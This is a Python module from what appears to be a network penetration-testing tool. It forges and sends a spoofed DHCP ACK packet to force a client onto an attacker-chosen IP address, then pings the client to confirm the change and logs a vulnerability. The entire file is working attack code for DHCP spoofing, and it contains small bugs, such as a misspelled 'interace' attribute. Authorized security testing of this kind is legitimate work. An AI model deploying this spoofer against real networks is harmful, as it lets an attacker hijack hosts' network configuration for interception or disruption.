import time
from ptsrvtester.protocols.dhcp.utils.registry import (
    random_xid,
    random_mac,
    sendp,
    prepare_ack_packet,
)

from icmplib import ping

__MODULELABEL__ = "DHCP ACK spoofer"
__MODULECODE__ = "ack_spoofer"
__ORDER__ = 100


def _contains_none_arg(ctx) -> bool:
    module_arg_names = [
        "client_mac",
        "client_ip",
        "netmask",
        "gateway_ip_address",
        "server_ip",
        "lease",
        "renewal_time",
        "rebinding_time"
    ]

    none_args = [k for k, v in vars(ctx.args).items() if k in module_arg_names and v is None]

    if none_args:
        ctx.out(f"Missing arguments: {', '.join(none_args)}", "ERROR", indent=4)
        return True

    return False


def _spoof_ack(ctx):
    """Send a spoofed DHCP ACK to a client to try and change his IP"""
    src_mac = ctx.mac or random_mac()
    transaction_id = ctx.xid or random_xid()

    sendp(
        prepare_ack_packet(
            src_mac,
            ctx.client_mac,
            transaction_id,
            ctx.client_ip,
            ctx.netmask,
            ctx.giaddr,
            ctx.server_ip,
            ctx.lease,
            ctx.renewal_time,
            ctx.rebinding_time
        ),
        iface=ctx.interace,
        verbose=False
    )

    time.sleep(3)

    ping_res = ping(
        address=ctx.client_ip,
        count=1,
        timeout=3
    )

    if ping_res.is_alive:
        ctx.out(f"Successfully changed the clients IP to {ctx.client_ip}", "VULN", indent=4)
        ctx.ptjsonlib.add_vulnerability("PTV-DHCP-ACK-SPOOFING")
    else:
        ctx.out(f"Could not change the clients IP", "OK", indent=4)


def run(ctx):
    if _contains_none_arg(ctx):
        return

    _spoof_ack(ctx)